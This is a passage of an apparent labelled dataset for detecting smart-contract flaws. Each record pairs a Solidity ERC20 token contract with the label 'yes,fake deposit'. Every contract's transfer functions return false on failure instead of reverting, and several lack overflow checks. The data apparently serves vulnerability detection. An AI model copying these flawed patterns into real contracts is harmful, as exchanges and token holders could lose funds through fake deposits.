false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n string public name = \"Rainbow Token\"; //Name of the token\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol =\"RNBO\"; //An identifier: eg AXM\n string public version = \"H1.1\"; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction ERC20Token(\n ) {\n balances[msg.sender] = 450000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 900000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"Rainbow Token\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"RNBO\"; // Set the symbol for display purposes\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 810000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 810000000; // Update total supply (100000 for example)\n name = \"Drone\"; // Set the name for display purposes\n decimals = 6; // Amount of decimals for display purposes\n symbol = \"DRONE\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'v1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n address owner;\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000; \n totalSupply = 100000000000; \n name = \"NFT Marketplace DCART\"; \n decimals = 4; \n symbol = \"DCART\"; \n owner = msg.sender;\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Keiko_Inu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Keiko Inu\";\n string public constant symbol = \"KEIKO\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\t// Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000000000000;\t\t// Update total supply (100000 for example)\n name = \"VISA\";\t\t\t\t\t// Set the name for display purposes\n decimals = 10;\t\t\t\t\t// Amount of decimals for display purposes\n symbol = \"VISA\";\t\t\t\t// Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Coin {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardCoin is Coin {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract BeautyCoin is StandardCoin {\n\n function () {\n //if ether is sent to this address, send it back.\n \n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function BeautyCoin(\n ) {\n balances[msg.sender] = 12000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 12000000000000000000; // Update total supply (100000 for example)\n name = \"BeautyCoin\"; // Set the name for display purposes\n decimals = 12; // Amount of decimals for display purposes\n symbol = \"BCN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() public constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) public constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract BeastToken is StandardToken {\n\n function () public {\n revert();\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n constructor() public {\n balances[msg.sender] = 1000000000000000000000000;\n totalSupply = 1000000000000000000000000;\n name = \"Beast Token\";\n decimals = 18;\n symbol = \"BEAST\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract EthereumIceCream is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Ice Cream\";\n string public constant symbol = \"ETHICE \ud83c\udf68\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.8.0;\n\ncontract ERC20Interface {\n \n /// @return supply total amount of tokens\n function totalSupply() public virtual view returns (uint256 supply) {}\n\n /// @param tokenOwner The address from which the balance will be retrieved\n /// @return balance The balance\n function balanceOf(address tokenOwner) public virtual view returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public virtual returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return success Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return success Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public virtual returns (bool success) {}\n\n /// @param tokenOwner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return remaining Amount of remaining tokens allowed to spent\n function allowance(address tokenOwner, address _spender) public virtual view returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract StandardToken is ERC20Interface {\n uint256 public _totalSupply;\n \n mapping (address => uint256) balances;\n //[tokenOwner][spender] = value\n //tokenOwner allows the spender to spend *value* of tokenOwner money\n mapping (address => mapping (address => uint256)) allowed;\n \n function transfer(address _to, uint256 _value) public override returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address tokenOwner) public view override returns (uint256 balance) {\n return balances[tokenOwner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address tokenOwner, address _spender) public view override returns (uint256 remaining) {\n return allowed[tokenOwner][_spender];\n }\n \n function totalSupply() public view override returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n\n}\n\ncontract MobiToken is StandardToken {\n\n \n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n\n constructor() {\n _totalSupply = 410000000; // Update total supply\n balances[msg.sender] = _totalSupply; // Give the creator all initial tokens\n name = \"Mobi Coin\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"MOBI\"; // Set the symbol for display purposes\n }\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
